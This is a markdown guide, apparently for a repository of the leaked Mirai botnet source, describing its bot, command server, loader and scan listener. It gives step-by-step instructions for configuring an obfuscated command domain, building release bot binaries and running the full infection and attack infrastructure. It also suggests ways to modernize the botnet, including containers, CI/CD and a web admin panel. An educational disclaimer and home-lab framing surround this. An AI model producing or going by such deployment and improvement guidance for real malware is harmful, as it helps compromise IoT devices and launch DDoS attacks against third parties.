# Mirai Botnet - Project Analysis & Modernization Guide

## 📋 Project Overview

This is the **Mirai botnet source code** - a historically significant IoT malware that was leaked in September 2016. This repository contains the complete infrastructure for running a botnet, including:

- **Bot malware** (C) - Infects IoT devices
- **Command & Control Server (CNC)** (Go) - Manages infected bots
- **Loader** (C) - Automatically loads malware onto compromised devices
- **Scanner** - Scans for vulnerable IoT devices
- **Database scripts** (MySQL) - Stores bot data and attack history

## ⚠️ IMPORTANT: Legal & Ethical Notice

**THIS IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY IN CONTROLLED ENVIRONMENTS**

- ✅ **Legal Uses**: Security research, penetration testing, network defense training in ISOLATED environments
- ❌ **Illegal Uses**: Attacking systems without authorization, creating botnets, unauthorized access
- 🔒 **This must ONLY be used in your isolated home lab with devices YOU OWN**
- ⚖️ Unauthorized use is ILLEGAL and carries severe criminal penalties

## 🏗️ Architecture Overview

### Components

1. **Bot (`/mirai/bot/`)**
   - Written in C for multiple architectures (ARM, MIPS, x86, etc.)
   - Connects to CNC server via domain resolution
   - Performs DDoS attacks when commanded
   - Scans for vulnerable IoT devices using telnet/SSH brute force
   - Self-propagates by reporting vulnerable devices to loader

2. **CNC Server (`/mirai/cnc/`)**
   - Written in Go
   - Provides command interface for operators
   - Manages connected bots
   - Coordinates DDoS attacks
   - Stores user accounts and attack history in MySQL

3. **Loader (`/loader/`)**
   - Written in C
   - Receives vulnerable device credentials from bots
   - Automatically loads bot malware onto new devices
   - Uses wget/tftp or echo-loading technique

4. **Scanner Listener (`/mirai/tools/scanListen.go`)**
   - Receives brute-force results from bots
   - Feeds credentials to loader for real-time propagation

## 📊 Data Flow

```
Bot → Scans IoT devices → Finds vulnerable device
  ↓
Bot → Reports to scanListen (port 48101)
  ↓
scanListen → Forwards to Loader
  ↓
Loader → Connects to vulnerable device
  ↓
Loader → Uploads bot binary
  ↓
New Bot → Connects to CNC
  ↓
[Cycle repeats]
```

## 🛠️ Technical Requirements

### System Requirements
- **Operating System**: Linux (Ubuntu/Debian recommended)
- **Compiler**: GCC (C99 standard)
- **Language Runtime**: Go 1.x
- **Database**: MySQL 5.7+
- **Libraries**: electric-fence (memory debugging)

### Cross-Compilation (for building bot binaries)
The bot must be compiled for multiple architectures to infect various IoT devices:
- ARM (v4l, v5l, v6l) - Most IoT devices, routers
- MIPS/MIPSEL - Routers, cameras
- x86/i586 - PC-based devices
- PowerPC - Some routers
- SPARC, M68K, SH4 - Specialized devices

## 📁 File Structure

```
Mirai-Source-Code/
├── mirai/
│   ├── bot/              # Bot malware source code
│   │   ├── main.c        # Bot entry point
│   │   ├── attack*.c     # DDoS attack implementations
│   │   ├── scanner.c     # Telnet/SSH scanner
│   │   ├── killer.c      # Kills competing malware
│   │   ├── table.c/h     # Obfuscated configuration
│   │   └── resolv.c/h    # Domain resolution
│   ├── cnc/              # Command & Control server (Go)
│   │   ├── main.go       # CNC entry point
│   │   ├── admin.go      # Admin command interface
│   │   ├── attack.go     # Attack coordination
│   │   └── database.go   # MySQL interaction
│   ├── tools/            # Utility tools
│   │   ├── enc.c         # String obfuscation encoder
│   │   ├── scanListen.go # Receives scan results
│   │   ├── nogdb.c       # Anti-debugging
│   │   └── badbot.c      # Bot testing
│   └── build.sh          # Main build script
├── loader/
│   ├── src/              # Loader source code
│   │   ├── main.c        # Loader entry point
│   │   ├── server.c      # HTTP server for binaries
│   │   └── connection.c  # Telnet connection handling
│   └── bins/             # Compiled bot binaries
├── scripts/
│   ├── db.sql            # MySQL database schema
│   └── cross-compile.sh  # Cross-compiler setup
└── README.md             # Basic setup instructions
```

## 🔧 Key Configuration Files

### 1. Bot Configuration (`/mirai/bot/table.c`)
This file contains obfuscated configuration values:
- `TABLE_CNC_DOMAIN` - Domain name where CNC is hosted
- `TABLE_CNC_PORT` - CNC connection port (default: 23)
- `TABLE_SCAN_CB_DOMAIN` - Domain for reporting scan results
- `TABLE_SCAN_CB_PORT` - Scan callback port (default: 48101)

These values are XOR-obfuscated and must be encoded using the `enc` tool.

### 2. CNC Configuration (`/mirai/cnc/main.go`)
```go
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"
```

## 🚀 Setup Process (Original Method)

### Step 1: Install Dependencies
```bash
apt-get update
apt-get install -y gcc golang electric-fence mysql-server mysql-client
```

### Step 2: Setup Database
```bash
# Login to MySQL
mysql -u root -p

# Create database and tables
source scripts/db.sql

# Add admin user
INSERT INTO users VALUES (NULL, 'admin', 'password123', 0, 0, 0, 0, -1, 1, 30, '');
```

### Step 3: Configure Bot
```bash
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai

# Build tools first
./build.sh debug telnet

# Generate obfuscated domain string
./debug/enc string your-cnc-domain.com

# Update mirai/bot/table.c with the output
# Replace TABLE_CNC_DOMAIN and update the byte count
```

### Step 4: Configure CNC
Edit `mirai/cnc/main.go`:
- Update database credentials
- Ensure they match your MySQL setup

### Step 5: Build Everything
```bash
# Build bot in debug mode (with output)
./build.sh debug telnet

# Build bot in release mode (production)
./build.sh release telnet

# Build loader
cd ../loader
./build.sh
```

### Step 6: Run Infrastructure
```bash
# Terminal 1: Start CNC
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/mirai
./release/cnc  # or ./debug/cnc

# Terminal 2: Start scan listener
./release/scanListen 48101  # or ./debug/scanListen 48101

# Terminal 3: Start loader
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code/loader
./loader

# Terminal 4: Connect to CNC (telnet to port 23)
telnet localhost 23
# Login with your admin credentials
```

## 🎯 What Each Component Does

### Bot (Malware)
- **Connects to CNC**: Receives commands via binary protocol
- **Performs DDoS attacks**: Multiple attack types (UDP, TCP, HTTP floods, etc.)
- **Scans for victims**: Brute-forces telnet/SSH on random IPs
- **Self-propagates**: Reports vulnerable devices for infection
- **Kills competitors**: Removes other malware from infected device
- **Evades detection**: Obfuscated strings, anti-debugging

### CNC (Command Server)
- **User authentication**: Admin interface with user management
- **Bot management**: Tracks connected bots and their capabilities
- **Attack commands**: Issues DDoS attack instructions
- **Statistics**: Records attack history and bot counts
- **API interface**: REST API for automation

### Loader
- **Receives targets**: From scanListen on port 48101
- **Tests connectivity**: Verifies credentials work
- **Deploys malware**: Uploads and executes bot binary
- **Multi-architecture**: Detects target architecture and loads appropriate binary
- **Echo loading**: If wget/tftp unavailable, uses echo commands

## 🔒 Security Features in the Code

1. **String Obfuscation**: Configuration values XOR-encrypted in table.c
2. **Domain-based CNC**: Harder to take down than IP-based
3. **Anti-debugging**: Detects GDB and other debuggers
4. **Process hiding**: Deletes own binary after execution
5. **Watchdog manipulation**: Prevents system crashes
6. **Single instance**: Prevents multiple bots on same device

## 🧪 Home Lab Testing Recommendations

### Isolated Network Setup
1. **Use VMs or containers** - Don't run on main systems
2. **Isolated network** - Separate VLAN or virtual network
3. **No internet access** - Prevent accidental spread
4. **Dedicated test devices** - Old routers, Raspberry Pis you own
5. **Monitoring** - Wireshark to observe bot behavior

### Testing Scenarios
- Observe bot connection to CNC
- Test various DDoS attack types (against your own servers)
- Study scan behavior (in isolated network)
- Analyze network traffic patterns
- Reverse engineer obfuscation techniques
- Study cross-architecture compilation

## 📚 Educational Value

This code is valuable for learning:
- **IoT Security**: How IoT devices get compromised
- **Network Programming**: Raw sockets, custom protocols
- **Malware Analysis**: Code obfuscation, evasion techniques
- **Botnet Architecture**: C&C communication, distributed systems
- **Cross-compilation**: Building for embedded architectures
- **Network Security**: DDoS attack mechanisms, defense strategies

## 🐛 Known Issues & Modernization Needs

1. **Outdated dependencies**: Uses older Go and GCC versions
2. **Cross-compilers missing**: Need to download/setup separately
3. **Hardcoded paths**: Some scripts assume specific directory structure
4. **No containerization**: Would benefit from Docker setup
5. **Limited documentation**: Original docs are minimal
6. **Security vulnerabilities**: Code has exploitable bugs (intentional for study)

## 🔄 Modernization Suggestions

1. **Docker containers** for isolated testing
2. **Updated build system** (CMake or modern Makefile)
3. **Modern Go modules** instead of GOPATH
4. **CI/CD pipeline** for automated builds
5. **Better documentation** with architecture diagrams
6. **Automated testing framework**
7. **Web-based admin panel** for CNC
8. **Logging and monitoring** improvements

## 📖 Further Reading

- Original forum post: See `ForumPost.md`
- Krebs on Security article about Mirai
- MalwareMustDie blog analysis
- IoT security best practices
- DDoS mitigation techniques

## 🎓 Learning Path

1. **Week 1**: Setup environment, build debug versions
2. **Week 2**: Analyze bot code, understand obfuscation
3. **Week 3**: Study CNC server, database structure
4. **Week 4**: Test in isolated network, observe behavior
5. **Week 5**: Implement defenses, write detection signatures
6. **Week 6**: Create presentation on IoT security lessons

## 🤝 Contributing to Security Research

Use this knowledge to:
- Develop IoT security tools
- Create vulnerability scanners
- Build intrusion detection systems
- Educate others about IoT risks
- Contribute to open-source security projects

---

**Remember**: With great power comes great responsibility. Use this knowledge ethically and legally.
